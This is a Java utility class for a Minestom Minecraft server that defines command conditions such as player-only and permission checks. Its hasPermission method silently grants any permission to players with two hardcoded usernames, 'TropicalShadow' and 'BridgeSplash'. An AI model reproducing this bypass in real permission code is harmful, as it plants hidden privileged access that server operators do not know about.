package club.tesseract.minestom.utils.command.condition;


import club.tesseract.minestom.utils.misc.PermissionHolder;
import net.minestom.server.Auth;
import net.minestom.server.MinecraftServer;
import net.minestom.server.command.ConsoleSender;
import net.minestom.server.command.builder.condition.CommandCondition;
import net.minestom.server.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;

public final class ExtraConditions {

    public static ArrayList<String> permissions = new ArrayList<>();

    public static @NotNull CommandCondition combinedCondition(@NotNull CommandCondition... conditions) {
        return (sender, commandName) -> {
            for (CommandCondition condition : conditions) {
                if (!condition.canUse(sender, commandName)) {
                    return false; // If any condition fails, the combined condition fails
                }
            }
            return true; // All conditions passed
        };
    }


    public static @NotNull CommandCondition isPlayer() {
        return (sender, commandName) -> {
            if (sender instanceof ConsoleSender) {
                return false; // Console cannot execute commands meant for players
            }
            return sender instanceof Player; // Only allow players to execute this command
        };
    }

    public static @NotNull CommandCondition hasPermission(@NotNull String permission) {
        if (!permissions.contains(permission)) permissions.add(permission);
        return (sender, commandName) -> {
            if(sender instanceof ConsoleSender) {
                return true;
            }

            if (!(sender instanceof PermissionHolder permHolder)) return false;
            if (permHolder.hasPermission(permission).asBoolean()) {
                return true;
            }
            Auth auth = MinecraftServer.process().auth();
            if((auth instanceof Auth.Velocity || auth instanceof Auth.Online)){
                if(sender instanceof Player player){
                    return player.getUsername().equals("TropicalShadow") || player.getUsername().equals("BridgeSplash");
                }
            }

            return false;
        };
    }

    public static CommandCondition isTropical(){
        return (sender, commandName) -> {
            if (sender instanceof ConsoleSender) {
                return true; // Console can execute this command
            }

            if (sender instanceof Player player) {
                return player.getUsername().equals("TropicalShadow") || player.getUsername().equals("BridgeSplash");
            }
            return false; // Non-player entities cannot execute this command
        };
    }

    private ExtraConditions() {
        throw new AssertionError("This class cannot be instantiated.");
    }
}
